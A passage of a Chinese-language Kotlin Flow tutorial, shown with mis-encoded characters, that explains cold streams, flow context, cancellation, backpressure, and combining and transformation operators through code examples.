    println(<span class="hljs-string">"å¼€å§‹æ”¶é›†"</span>)
    getCitiesFlow()
        .onEach { println(<span class="hljs-string">"å¤„ç†: <span class="hljs-variable">$it</span>"</span>) }
        .collect { 
            println(<span class="hljs-string">"æ”¶é›†åˆ°: <span class="hljs-variable">$it</span>"</span>)
        }
    println(<span class="hljs-string">"æ”¶é›†å®Œæˆ"</span>)
}
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>æ”¯æŒÂ <code>suspend</code>Â å‡½æ•°ï¼ˆå¦‚ç½‘ç»œã€æ•°æ®åº“ï¼‰</li>
<li>å†·æµï¼šä¸ collect å°±ä¸æ‰§è¡Œ</li>
<li>è‡ªåŠ¨åç¨‹å–æ¶ˆï¼ˆç»“æ„åŒ–å¹¶å‘ï¼‰</li>
</ul>
<h2 data-id="heading-14">äº”ã€Flow ä¸å…¶ä»–æ–¹å¼çš„åŒºåˆ«</h2>















































<table><thead><tr><th>ç‰¹æ€§</th><th><code>List</code></th><th><code>Sequence</code></th><th><code>Channel</code></th><th><code>Flow</code></th></tr></thead><tbody><tr><td>åŒæ­¥/å¼‚æ­¥</td><td>åŒæ­¥</td><td>åŒæ­¥</td><td>å¼‚æ­¥</td><td><strong>å¼‚æ­¥</strong></td></tr><tr><td>æ”¯æŒ suspend</td><td>âŒ</td><td>âŒ</td><td>âœ…</td><td>âœ…</td></tr><tr><td>å†·/çƒ­</td><td>N/A</td><td>å†·</td><td>çƒ­</td><td><strong>å†·</strong></td></tr><tr><td>è‡ªåŠ¨å–æ¶ˆ</td><td>âŒ</td><td>âŒ</td><td>æ‰‹åŠ¨ç®¡ç†</td><td>âœ…ï¼ˆç»“æ„åŒ–å¹¶å‘ï¼‰</td></tr><tr><td>èƒŒå‹å¤„ç†</td><td>âŒ</td><td>âŒ</td><td>éœ€æ‰‹åŠ¨ç¼“å†²</td><td>âœ…ï¼ˆ<code>buffer()</code>,Â <code>conflate()</code>ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-15">å…­ã€Flow çš„ä¸€ä¸ªå…¸å‹åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-16">åœºæ™¯ï¼šå®æ—¶æœç´¢ï¼ˆDebounced Searchï¼‰</h3>
<p>ç”¨æˆ·è¾“å…¥å…³é”®è¯ï¼Œè‡ªåŠ¨å»æœåŠ¡å™¨æœç´¢ï¼Œä½†è¦é˜²æŠ–ã€é˜²é‡å¤è¯·æ±‚ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _query = MutableStateFlow(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">val</span> results = _query
        .debounce(<span class="hljs-number">300</span>)                <span class="hljs-comment">// é˜²æŠ–ï¼š300ms å†…æ— æ–°è¾“å…¥æ‰è§¦å‘</span>
        .distinctUntilChanged()       <span class="hljs-comment">// ç›¸åŒæŸ¥è¯¢ä¸é‡å¤è¯·æ±‚</span>
        .flatMapLatest { query -&gt;     <span class="hljs-comment">// åªä¿ç•™æœ€æ–°æŸ¥è¯¢çš„ç»“æœ</span>
            <span class="hljs-keyword">if</span> (query.isBlank()) flowOf(emptyList())
            <span class="hljs-keyword">else</span> searchRepository.search(query)
        }
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(), emptyList())
}
</code></pre>
<p>âœ… æ•ˆæœï¼š</p>
<ul>
<li>ç”¨æˆ·å¿«é€Ÿæ‰“å­— â€œaâ€ â†’ â€œabâ€ â†’ â€œabcâ€ï¼Œåªå‘èµ·ä¸€æ¬¡ â€œabcâ€ è¯·æ±‚</li>
<li>ä¸Šä¸€ä¸ªæœªå®Œæˆçš„è¯·æ±‚è‡ªåŠ¨å–æ¶ˆï¼ˆ<code>flatMapLatest</code>Â çš„é­”åŠ›ï¼‰</li>
</ul>
<h2 data-id="heading-17">ä¸ƒã€ä»€ä¹ˆæ˜¯å†·æµï¼ˆCold Streamï¼‰</h2>
<blockquote>
<p><strong>å†·æµï¼šæ¯æ¬¡è¢« collect æ—¶ï¼Œéƒ½ä¼šé‡æ–°æ‰§è¡Œæ•´ä¸ªæµæ„å»ºé€»è¾‘ã€‚</strong></p>
</blockquote>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> coldFlow = flow {
    println(<span class="hljs-string">"Flow started!"</span>)
    emit(<span class="hljs-number">1</span>)
    emit(<span class="hljs-number">2</span>)
}

<span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ”¶é›†</span>
coldFlow.collect { println(<span class="hljs-string">"A: <span class="hljs-variable">$it</span>"</span>) }
<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// Flow started!</span>
<span class="hljs-comment">// A: 1</span>
<span class="hljs-comment">// A: 2</span>

<span class="hljs-comment">// ç¬¬äºŒæ¬¡æ”¶é›†</span>
coldFlow.collect { println(<span class="hljs-string">"B: <span class="hljs-variable">$it</span>"</span>) }
<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// Flow started!  â† é‡æ–°æ‰§è¡Œï¼</span>
<span class="hljs-comment">// B: 1</span>
<span class="hljs-comment">// B: 2</span>
</code></pre>
<p>ğŸ” å¯¹æ¯”çƒ­æµï¼ˆå¦‚ <code>StateFlow</code>ï¼‰ï¼š</p>
<ul>
<li>çƒ­æµåªæœ‰ä¸€ä¸ªç”Ÿäº§è€…ï¼Œå¤šä¸ªè§‚å¯Ÿè€…å…±äº«åŒä¸€ä»½æ•°æ®æµ</li>
<li>å†·æµæ¯æ¬¡ collect éƒ½æ˜¯ç‹¬ç«‹æ‰§è¡Œ</li>
<li>ï¼ˆæœ‰ç§¯ç´¯åœ°å»åˆ›ä¸šï¼‰</li>
</ul>
<blockquote>
<p>âœ… å†·æµé€‚åˆï¼š<strong>æ¯æ¬¡éƒ½éœ€è¦é‡æ–°è®¡ç®—çš„æ•°æ®</strong>ï¼ˆå¦‚ç½‘ç»œè¯·æ±‚ã€æ•°æ®åº“æŸ¥è¯¢ï¼‰</p>
</blockquote>
<h2 data-id="heading-18">å…­ã€æµçš„è¿ç»­æ€§ï¼ˆSequential Executionï¼‰</h2>
<p>Flow ä¸­çš„æ“ä½œæ˜¯<strong>é¡ºåºæ‰§è¡Œ</strong>çš„ï¼Œå³ä½¿æœ‰ <code>delay</code> æˆ– <code>emit</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">flow {
    emit(<span class="hljs-string">"A"</span>)
    delay(<span class="hljs-number">1000</span>)
    emit(<span class="hljs-string">"B"</span>)
}
.map { it.lowercase() }
.onEach { println(<span class="hljs-string">"Processed: <span class="hljs-variable">$it</span>"</span>) }
.collect { println(<span class="hljs-string">"Collected: <span class="hljs-variable">$it</span>"</span>) }
</code></pre>
<p>è¾“å‡ºï¼ˆæŒ‰æ—¶é—´é¡ºåºï¼‰ï¼š</p>
<pre><code class="hljs language-text" lang="text">Processed: a
Collected: a
ï¼ˆ1ç§’åï¼‰
Processed: b
Collected: b
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼š<strong>ä¸­é—´æ“ä½œç¬¦ä¸ä¼šå¹¶è¡Œæ‰§è¡Œ</strong>ï¼è¿™æ˜¯ Flow çš„è®¾è®¡å“²å­¦ï¼šç®€å•ã€å¯é¢„æµ‹ã€‚</p>
</blockquote>
<h2 data-id="heading-19">å…«ã€æµæ„å»ºå™¨ï¼ˆFlow Buildersï¼‰</h2>



































<table><thead><tr><th>æ„å»ºå™¨</th><th>ç”¨é€”</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>flow { }</code></td><td>åŸºç¡€æ„å»ºå™¨ï¼Œæ”¯æŒÂ <code>emit</code>Â å’ŒÂ <code>suspend</code></td><td><code>flow { emit(fetchData()) }</code></td></tr><tr><td><code>flowOf()</code></td><td>ä»å›ºå®šå€¼åˆ›å»º Flow</td><td><code>flowOf(1, 2, 3)</code></td></tr><tr><td><code>asFlow()</code></td><td>å°†é›†åˆ/åºåˆ—è½¬ä¸º Flow</td><td><code>(1..5).asFlow()</code></td></tr><tr><td><code>channelFlow { }</code></td><td>é«˜çº§ï¼šå¯åœ¨ä¸åŒåç¨‹ä¸­ emitï¼ˆçƒ­æµé›å½¢ï¼‰</td><td>è§ä¸‹æ–‡</td></tr><tr><td><code>callbackFlow { }</code></td><td>æ¡¥æ¥å›è°ƒ APIï¼ˆå¦‚ä¼ æ„Ÿå™¨ã€Firebaseï¼‰</td><td>âœ… Android å¸¸ç”¨</td></tr></tbody></table>
<h3 data-id="heading-20"><code>callbackFlow</code>Â ç¤ºä¾‹ï¼ˆç›‘å¬ä½ç½®æ›´æ–°ï¼‰</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">locationFlow</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span> = callbackFlow&lt;Location&gt; {
    <span class="hljs-keyword">val</span> listener = LocationListener { location -&gt;
        trySend(location) <span class="hljs-comment">// å®‰å…¨å‘é€ï¼ˆä¸ä¼šå› å–æ¶ˆè€Œå´©æºƒï¼‰</span>
    }
    <span class="hljs-keyword">val</span> locationManager = context.getSystemService(LOCATION_SERVICE) <span class="hljs-keyword">as</span> LocationManager
    locationManager.requestLocationUpdates(..., listener)

    <span class="hljs-comment">// å–æ¶ˆæ—¶æ¸…ç†</span>
    awaitClose {
        locationManager.removeUpdates(listener)
    }
}
</code></pre>
<h2 data-id="heading-21">ä¹ã€æµä¸Šä¸‹æ–‡ï¼ˆFlow Contextï¼‰</h2>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>Flow æ„å»ºå™¨ä¸­çš„ä»£ç è¿è¡Œåœ¨è°ƒç”¨è€…çš„åç¨‹ä¸Šä¸‹æ–‡ä¸­</strong>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">lifecycleScope.launch(Dispatchers.Main) {
    flow {
        println(<span class="hljs-string">"Thread: <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>) <span class="hljs-comment">// Main</span>
        emit(<span class="hljs-number">1</span>)
    }.collect { ... }
}
</code></pre>
<p>ä½†å¯ä»¥ç”¨ <code>flowOn</code> <strong>æ”¹å˜ä¸Šæ¸¸æ“ä½œçš„è°ƒåº¦å™¨</strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">flow {
    println(<span class="hljs-string">"IO Thread: <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
    emit(fetchFromNetwork()) <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
}
.flowOn(Dispatchers.IO) <span class="hljs-comment">// â† æ”¹å˜ flow {} çš„æ‰§è¡Œçº¿ç¨‹</span>
.map { it.toUiModel() }
.collect { <span class="hljs-comment">/* åœ¨ Main çº¿ç¨‹ */</span> }
</code></pre>
<ul>
<li>æ•°æ®è·å–ç”¨Â <code>flowOn(Dispatchers.IO)</code></li>
<li>UI è½¬æ¢å’Œ collect åœ¨Â <code>Main</code>Â çº¿ç¨‹</li>
</ul>
<h2 data-id="heading-22">åã€åœ¨æŒ‡å®šåç¨‹ä¸­æ”¶é›†æµ</h2>
<p>æ”¶é›†ï¼ˆcollectï¼‰æ€»æ˜¯åœ¨<strong>å¯åŠ¨åç¨‹çš„ä¸Šä¸‹æ–‡ä¸­</strong>æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// åœ¨ IO çº¿ç¨‹æ”¶é›†</span>
withContext(Dispatchers.IO) {
    myFlow.collect { 
        <span class="hljs-comment">// è¿™é‡Œä¹Ÿåœ¨ IO çº¿ç¨‹</span>
    }
}

<span class="hljs-comment">// åœ¨ Main çº¿ç¨‹æ”¶é›†ï¼ˆAndroid æ¨èï¼‰</span>
lifecycleScope.launch(Dispatchers.Main) {
    myFlow.collect { updateUI(it) } <span class="hljs-comment">// å®‰å…¨æ›´æ–° UI</span>
}
</code></pre>
<p><strong>é‡è¦</strong>ï¼šä¸è¦åœ¨éä¸»çº¿ç¨‹æ›´æ–° UIï¼›</p>
<h2 data-id="heading-23">åä¸€ã€æµçš„å–æ¶ˆ</h2>
<p>Flow æ”¶é›†æ˜¯<strong>å¯å–æ¶ˆçš„</strong>ï¼Œéµå¾ªåç¨‹çš„åä½œå¼å–æ¶ˆæœºåˆ¶ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> job = lifecycleScope.launch {
    countDownFlow().collect { ... }
}

<span class="hljs-comment">// 1ç§’åå–æ¶ˆ</span>
lifecycleScope.launch {
    delay(<span class="hljs-number">1000</span>)
    job.cancel()
}
</code></pre>
<p>å½“ <code>job.cancel()</code> è¢«è°ƒç”¨ï¼š</p>
<ul>
<li><code>collect</code>Â ç«‹å³åœæ­¢</li>
<li>Flow æ„å»ºå™¨ä¸­çš„Â <code>emit</code>Â åç»­ä¸å†æ‰§è¡Œ</li>
<li>å¦‚æœæ­£åœ¨Â <code>delay()</code>ï¼Œä¼šæŠ›å‡ºÂ <code>CancellationException</code>ï¼ˆé™é»˜å¤„ç†ï¼‰</li>
</ul>
<h2 data-id="heading-24">åäºŒã€æµçš„å–æ¶ˆæ£€æµ‹</h2>
<p>åœ¨è‡ªå®šä¹‰ Flow ä¸­ï¼Œè‹¥æ‰§è¡Œé•¿æ—¶é—´è®¡ç®—ï¼ˆéæŒ‚èµ·å‡½æ•°ï¼‰ï¼Œéœ€<strong>ä¸»åŠ¨æ£€æµ‹å–æ¶ˆ</strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">flow {
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.1_000_000</span>) {
        <span class="hljs-comment">// ä¸»åŠ¨æ£€æŸ¥æ˜¯å¦è¢«å–æ¶ˆ</span>
        <span class="hljs-keyword">if</span> (currentCoroutineContext().isActive.not()) {
            <span class="hljs-keyword">break</span>
        }
        emit(expensiveCalculation(i))
    }
}
</code></pre>
<p>æˆ–ä½¿ç”¨ <code>ensureActive()</code>ï¼ˆæ¨èï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">flow {
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.1_000_000</span>) {
        ensureActive() <span class="hljs-comment">// è‹¥å·²å–æ¶ˆï¼ŒæŠ›å‡º CancellationException</span>
        emit(i)
    }
}
</code></pre>
<blockquote>
<p>è¿™æ ·å³ä½¿æ²¡æœ‰æŒ‚èµ·ç‚¹ï¼Œä¹Ÿèƒ½å“åº”å–æ¶ˆã€‚</p>
</blockquote>
<h2 data-id="heading-25">åä¸‰ã€ä½¿ç”¨ç¼“å†²ä¸Â <code>flowOn</code>Â å¤„ç†èƒŒå‹ï¼ˆBackpressureï¼‰</h2>
<h3 data-id="heading-26">èƒŒå‹åœºæ™¯ï¼š</h3>
<blockquote>
<p>ç”Ÿäº§è€…ï¼ˆemitï¼‰é€Ÿåº¦ &gt; æ¶ˆè´¹è€…ï¼ˆcollectï¼‰é€Ÿåº¦</p>
</blockquote>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> fastProducer = flow {
    repeat(<span class="hljs-number">100</span>) {
        delay(<span class="hljs-number">10</span>)   <span class="hljs-comment">// æ¯ 10ms å‘ä¸€ä¸ª</span>
        emit(it)
    }
}

fastProducer.collect {
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// æ¯ 1s å¤„ç†ä¸€ä¸ª â†’ èƒŒå‹ï¼</span>
}
</code></pre>
<h3 data-id="heading-27">è§£å†³æ–¹æ¡ˆï¼š</h3>
<h4 data-id="heading-28">1.Â <code>buffer()</code>ï¼šå¯ç”¨ç¼“å†²é€šé“ï¼ˆé»˜è®¤å®¹é‡ 64ï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">fastProducer
    .buffer() <span class="hljs-comment">// ç”Ÿäº§è€…å¯ç»§ç»­ emitï¼Œå€¼å­˜å…¥ç¼“å†²åŒº</span>
    .collect { ... }
</code></pre>
<h4 data-id="heading-29">2.Â <code>conflate()</code>ï¼šåªä¿ç•™æœ€æ–°å€¼ï¼ˆä¸¢å¼ƒä¸­é—´å€¼ï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">sensorDataFlow
    .conflate() <span class="hljs-comment">// UI åªå…³å¿ƒæœ€æ–°ä¼ æ„Ÿå™¨æ•°æ®ï¼Œæ—§çš„å¯ä¸¢</span>
    .collect { updateChart(it) }
</code></pre>
<h4 data-id="heading-30">3.Â <code>collectLatest</code>ï¼šå–æ¶ˆå‰ä¸€ä¸ªæ”¶é›†å—</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">searchQueries
    .mapLatest { query -&gt; api.search(query) } <span class="hljs-comment">// è‡ªåŠ¨å–æ¶ˆä¸Šä¸€ä¸ªæœç´¢</span>
    .collect { showResults(it) }
</code></pre>
<p><code>flowOn</code> ä¹Ÿä¼šéšå¼å¯ç”¨ç¼“å†²ï¼Œé¿å…é˜»å¡ä¸Šæ¸¸ã€‚</p>
<h2 data-id="heading-31">åå››ã€åˆå¹¶ä¸å¤„ç†æœ€æ–°å€¼</h2>






























<table><thead><tr><th>æ“ä½œç¬¦</th><th>è¡Œä¸º</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>merge()</code></td><td>åˆå¹¶å¤šä¸ª Flowï¼Œè° emit è°å…ˆå¤„ç†</td><td>å¤šä¸ªç‹¬ç«‹æ•°æ®æº</td></tr><tr><td><code>combine()</code></td><td>å½“ä»»ä¸€ Flow emitï¼Œç»„åˆæœ€æ–°å€¼</td><td>è¡¨å•éªŒè¯ï¼ˆusername + passwordï¼‰</td></tr><tr><td><code>zip()</code></td><td>æˆå¯¹ emitï¼ˆç¬¬ä¸€ä¸ª Flow çš„ç¬¬ n ä¸ª + ç¬¬äºŒä¸ªçš„ç¬¬ n ä¸ªï¼‰</td><td>ä¸¥æ ¼åŒæ­¥æ•°æ®</td></tr><tr><td><code>flatMapLatest</code></td><td>å¯¹æ¯ä¸ªå€¼å¯åŠ¨æ–° Flowï¼Œ<strong>åªä¿ç•™æœ€æ–°çš„</strong></td><td>æœç´¢ã€è‡ªåŠ¨è¡¥å…¨</td></tr></tbody></table>
<h3 data-id="heading-32">1. <code>merge()</code>- åˆå¹¶å¤šä¸ªç‹¬ç«‹æµ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-comment">// å¤šä¸ªç‹¬ç«‹çš„æ•°æ®æº</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> userFlow = repository.observeUser()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> messagesFlow = repository.observeMessages()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> notificationsFlow = repository.observeNotifications()
    
    <span class="hljs-keyword">val</span> allUpdates = merge(
        userFlow.map { <span class="hljs-string">"ç”¨æˆ·æ›´æ–°: <span class="hljs-variable">$it</span>"</span> },
        messagesFlow.map { <span class="hljs-string">"æ–°æ¶ˆæ¯: <span class="hljs-subst">${it.count()}</span> æ¡"</span> },
        notificationsFlow.map { <span class="hljs-string">"é€šçŸ¥: <span class="hljs-variable">$it</span>"</span> }
    )
    
    <span class="hljs-comment">// å¤„ç†ä¸åŒç±»å‹çš„æ›´æ–°</span>
    <span class="hljs-keyword">init</span> {
        viewModelScope.launch {
            allUpdates.collect { update -&gt;
                <span class="hljs-keyword">when</span> {
                    update.startsWith(<span class="hljs-string">"ç”¨æˆ·æ›´æ–°"</span>) -&gt; handleUserUpdate(update)
                    update.startsWith(<span class="hljs-string">"æ–°æ¶ˆæ¯"</span>) -&gt; showMessageBadge(update)
                    update.startsWith(<span class="hljs-string">"é€šçŸ¥"</span>) -&gt; showNotification(update)
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-33">2. <code>combine</code>Â - ç»„åˆæœ€æ–°å€¼</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> isLoginEnabled = combine(
    usernameFlow,
    passwordFlow
) { username, password -&gt;
    username.isNotBlank() &amp;&amp; password.length &gt;= <span class="hljs-number">6</span>
}
</code></pre>
<h3 data-id="heading-34">3. <code>zip()</code>- æˆå¯¹ç»„åˆ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä¸¤ä¸ª API è¯·æ±‚çš„ç»“æœéœ€è¦é…å¯¹å¤„ç†</span>
<span class="hljs-keyword">val</span> userFlow = flow {
    emit(<span class="hljs-string">"User1"</span>)
    delay(<span class="hljs-number">1000</span>)
    emit(<span class="hljs-string">"User2"</span>)
    delay(<span class="hljs-number">1000</span>)
    emit(<span class="hljs-string">"User3"</span>)
}

<span class="hljs-keyword">val</span> scoreFlow = flow {
    emit(<span class="hljs-number">95</span>)
    delay(<span class="hljs-number">500</span>)
    emit(<span class="hljs-number">88</span>)
    delay(<span class="hljs-number">500</span>)
    emit(<span class="hljs-number">92</span>)
    delay(<span class="hljs-number">500</span>)
    emit(<span class="hljs-number">85</span>) <span class="hljs-comment">// è¿™ä¸ªå€¼ä¸ä¼šè¢«å¤„ç†ï¼Œå› ä¸º userFlow åªæœ‰ 3 ä¸ªå€¼</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    userFlow.zip(scoreFlow) { user, score -&gt;
        <span class="hljs-string">"<span class="hljs-variable">$user</span>: <span class="hljs-variable">$score</span> points"</span>
    }.collect { result -&gt;
        println(result)
    }
}
</code></pre>
<h3 data-id="heading-35">4. <code>flatMapLatest</code>- å¤„ç†æœ€æ–°å€¼</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æœç´¢åŠŸèƒ½å®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">val</span> searchQuery = MutableStateFlow(<span class="hljs-string">""</span>)
    
    <span class="hljs-keyword">val</span> searchResults = searchQuery
        .debounce(<span class="hljs-number">300</span>)  <span class="hljs-comment">// é˜²æŠ–</span>
        .filter { it.length &gt;= <span class="hljs-number">2</span> }  <span class="hljs-comment">// è¿‡æ»¤çŸ­æŸ¥è¯¢</span>
        .distinctUntilChanged()  <span class="hljs-comment">// å»é‡</span>
        .flatMapLatest { query -&gt;
            performSearch(query)  <span class="hljs-comment">// å¯¹æ¯ä¸ªæŸ¥è¯¢å¯åŠ¨æœç´¢</span>
                .<span class="hljs-keyword">catch</span> { emit(emptyList()) }  <span class="hljs-comment">// é”™è¯¯å¤„ç†</span>
                .onStart { emit(emptyList()) }  <span class="hljs-comment">// æ˜¾ç¤ºåŠ è½½çŠ¶æ€</span>
        }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performSearch</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;List&lt;SearchResult&gt;&gt; = flow {
        <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
        delay(<span class="hljs-number">1000</span>)
        <span class="hljs-keyword">val</span> results = searchApi.search(query)
        emit(results)
    }
    
    <span class="hljs-comment">// åœ¨ UI ä¸­æ”¶é›†</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">observeResults</span><span class="hljs-params">()</span></span>: Flow&lt;List&lt;SearchResult&gt;&gt; = searchResults
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
viewModelScope.launch {
    searchResults.collect { results -&gt;
        updateSearchResults(results)
    }
}
</code></pre>
<h2 data-id="heading-36">åäº”ã€è½¬æ¢æ“ä½œç¬¦</h2>





















<table><thead><tr><th>æ“ä½œç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>map</code></td><td>ä¸€å¯¹ä¸€è½¬æ¢</td></tr><tr><td><code>transform</code></td><td>æ‰‹åŠ¨æ§åˆ¶ emitï¼ˆå¯ emit å¤šä¸ªæˆ–è·³è¿‡ï¼‰</td></tr><tr><td><code>scan</code></td><td>ç´¯ç§¯è®¡ç®—ï¼ˆç±»ä¼¼ reduceï¼Œä½† emit ä¸­é—´ç»“æœï¼‰</td></tr></tbody></table>
<ol>
<li><code>map</code>- ä¸€å¯¹ä¸€è½¬æ¢</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç½‘ç»œæ•°æ®æ¨¡å‹ -&gt; UI æ•°æ®æ¨¡å‹</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserResponse</span>(
    <span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">val</span> email: String,
    <span class="hljs-keyword">val</span> createdAt: String
)

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserUI</span>(
    <span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">val</span> displayName: String,
    <span class="hljs-keyword">val</span> email: String,
    <span class="hljs-keyword">val</span> joinDate: String
)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">val</span> users: Flow&lt;List&lt;UserUI&gt;&gt; = userRepository.getUsers()
        .map { userList -&gt;
            <span class="hljs-comment">// æ‰¹é‡è½¬æ¢</span>
            userList.map { response -&gt;
                UserUI(
                    id = response.id,
                    displayName = response.name.capitalize(),
                    email = response.email,
                    joinDate = formatDate(response.createdAt)
                )
            }
        }
}
</code></pre>
<ol start="2">
<li><code>transform</code>- æ‰‹åŠ¨æ§åˆ¶ emit</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// transform çš„çµæ´»æ€§</span>
flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
    .transform { value -&gt;
        <span class="hljs-keyword">if</span> (value % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {
            emit(<span class="hljs-string">"å¶æ•°: <span class="hljs-variable">$value</span>"</span>)  <span class="hljs-comment">// å¯ä»¥ emit ä¸åŒç±»å‹</span>
            emit(<span class="hljs-string">"double: <span class="hljs-subst">${value * <span class="hljs-number">2</span>}</span>"</span>)  <span class="hljs-comment">// å¯ä»¥ emit å¤šä¸ªå€¼</span>
        }
        <span class="hljs-comment">// è·³è¿‡å¥‡æ•°å€¼</span>
    }
    .collect { println(it) }
<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// å¶æ•°: 2</span>
<span class="hljs-comment">// double: 4</span>
<span class="hljs-comment">// å¶æ•°: 4</span>
<span class="hljs-comment">// double: 8</span>
</code></pre>
<ol start="3">
<li><code>scan</code>- ç´¯ç§¯è®¡ç®—</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç´¯åŠ è®¡ç®—</span>
flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
    .scan(<span class="hljs-number">0</span>) { accumulator, value -&gt;
        accumulator + value
    }
    .collect { println(<span class="hljs-string">"å½“å‰ç´¯åŠ å’Œ: <span class="hljs-variable">$it</span>"</span>) }
<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// å½“å‰ç´¯åŠ å’Œ: 0</span>
<span class="hljs-comment">// å½“å‰ç´¯åŠ å’Œ: 1</span>
<span class="hljs-comment">// å½“å‰ç´¯åŠ å’Œ: 3</span>
<span class="hljs-comment">// å½“å‰ç´¯åŠ å’Œ: 6</span>
<span class="hljs-comment">// å½“å‰ç´¯åŠ å’Œ: 10</span>
<span class="hljs-comment">// å½“å‰ç´¯åŠ å’Œ: 15</span>

<span class="hljs-comment">// ä¸ reduce å¯¹æ¯”</span>
flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
    .reduce { acc, value -&gt; acc + value }  <span class="hljs-comment">// åªè¾“å‡ºæœ€ç»ˆç»“æœ: 15</span>
</code></pre>
<h2 data-id="heading-37">åå…­ã€é™é•¿æ“ä½œç¬¦</h2>

























<table><thead><tr><th>æ“ä½œç¬¦</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>take(n)</code></td><td>åªå–å‰ n ä¸ªå€¼</td></tr><tr><td><code>takeWhile { }</code></td><td>æ»¡è¶³æ¡ä»¶å°±å–ï¼Œä¸€æ—¦ä¸æ»¡è¶³å°±åœæ­¢</td></tr><tr><td><code>drop(n)</code></td><td>è·³è¿‡å‰ n ä¸ª</td></tr><tr><td><code>first()</code>Â /Â <code>single()</code></td><td>ç»ˆç«¯æ“ä½œï¼Œè¿”å›å•ä¸ªå€¼</td></tr></tbody></table>
<h2 data-id="heading-38">åä¸ƒã€æœ«ç«¯æ“ä½œç¬¦</h2>





























